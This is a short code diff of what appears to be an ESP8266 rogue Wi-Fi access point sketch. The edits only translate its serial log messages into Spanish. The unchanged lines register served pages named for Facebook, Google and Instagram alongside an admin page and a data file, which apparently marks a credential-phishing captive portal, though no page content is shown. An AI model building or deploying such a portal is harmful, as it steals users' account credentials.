@@ -28,13 +28,13 @@ void setup()
   Serial.setDebugOutput(true);
   delay(2000);
 
-  Serial.println("Loading....");
+  Serial.println("Cargando....");
   delay(1000);
 
   accessPoint->setPath(ADMIN_PAGE, ADMINPAGE);
   accessPoint->setPath(AUTH_PAGE,  INDEXPAGE);
   accessPoint->setPath(DATA_FILE,  DATAFILE);
-
+  
   accessPoint->setPath(FB_PATH, FACEBOOK);
   accessPoint->setPath(GL_PATH, GOOGLE);
   accessPoint->setPath(IS_PATH, INSTAGRAM);
@@ -44,10 +44,10 @@ void setup()
   WiFi.hostname("ESP.server");
   WiFi.softAPConfig(*serverip, *serverip, IPAddress(255, 255, 255, 0));
   if (!accessPoint->initialize(SSID, PASS, WIFI_SSID, WIFI_PSW))
-    Serial.println("Error en la configuración del punto de acceso");
+    Serial.println("Error en la configuración del servidor");
 
 
-  Serial.println("Config done!");
+  Serial.println("Configuración acabada!");
   
 }
 
@@ -56,7 +56,7 @@ void loop()
   accessPoint->process();
 
   if (printed<=0){
-    Serial.println("wainting for client to connect");
+    Serial.println("En espera de solicitudes...");
     printed++;
   }
 
